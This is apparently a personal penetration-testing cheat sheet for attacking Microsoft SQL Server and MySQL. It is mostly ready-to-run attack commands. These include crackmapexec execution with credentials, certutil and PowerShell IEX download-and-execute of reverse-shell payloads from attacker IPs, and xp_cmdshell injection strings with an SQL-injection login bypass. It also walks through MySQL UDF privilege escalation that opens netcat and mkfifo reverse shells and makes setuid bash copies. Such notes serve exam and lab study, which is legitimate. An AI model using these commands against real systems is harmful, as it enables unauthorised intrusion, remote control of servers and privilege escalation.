# SQL
-----

## MSSQL

### Command execution using crackmapexec
```bash
cme mssql 10.11.1.31 -u sa -p 'poiuytrewq' --local-auth -x "whoami"
```

```bash
cme mssql 10.11.1.111 -u sa -p 'sqls3rv3r' --local-auth -x "certutil.exe -urlcache -split -f http://192.168.119.230:8000/shell.exe shell.exe & shell.exe"
```
---------------

### Extracting hashes from master.mdf file  
(Refer [[OSCP/Labs/Public/1nsider/1nsider]])
location of master.mdf file 
```shell
\Program Files\SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
```

Sometimes the file can also be in the Backup directory.

absolute path of the file (dir /x)
```bash
\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
```

After downloading this file we can extract hashes using this ps1 script:
https://blog.xpnsec.com/extracting-master-mdf-hashes/

Importing custom dll:
```Powershell
Add-Type -AssemblyName ./OrcaMDF.Framework.dll 
Add-Type -AssemblyName ./OrcaMDF.RawCore.dll
```

https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes
https://github.com/xpn/Powershell-PostExploitation/issues/1
Crack the hash using John.

--------

### XP_CMDSHELL
Refer [[dj]]
configuring
```txt
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

testing using certutil
```txt
';EXEC xp_cmdshell 'certutil -f -urlcache http://192.168.119.219/test.txt';--
```

importing and executing Invoke-PowerShellTcp.ps1 for reverse shell
```txt
';EXEC xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://192.168.119.219/Invoke-PowerShellTcp.ps1.')"--
```

https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/
https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell-with-nishang/
https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell/
---------------

### XP_DIRTREE

xp_dirtree


-------




### MSSQL injection   
(Refer [[Mail]])
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/
https://kaoticcreations.blogspot.com/2011/10/microsoft-sql-server-mssql-and-sql.html
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet







### SQL Injection authentication bypass
----------
```
admin' -- -
```





## MySQL
-----------

connecting to a mysql instance
```bash
mysql -h localhost -u root -p   # will prompt for password
```


### Privilege escalation using UDF
when we know the password of the sql instance and the instance is being run as root:
```bash
ps aux | grep root | grep sql
```

https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

download the raptor_udf2.c from https://www.exploit-db.com/exploits/1518
compile the  C code into a .so:

```bash
gcc -g -c raptor_udf2.c

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Now authenticate to mysql and run the following commands:
```bash
show variables like '%plugin%';  # locating the plugin path

show variables like '%secure_file_priv%';  # if the returned value is empty it means the variable is empty and we can load data into the database

use mysql;

create table foo(line blob);

insert into foo values(load_file('/var/www/raptor_udf2.so'));

insert into foo values(load_file('/tmp/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';


select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

select * from mysql.func;  # confirm the function is present

select do_system('/usr/bin/nc 192.168.49.136 8080 -e /bin/bash');
select do_system('chmod +s /bin/bash');
select do_system('m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.22 8080 >/tmp/f');

select do_system('cp /bin/bash /tmp/bash');
select do_system('chmod +s /tmp/bash');

```
------------------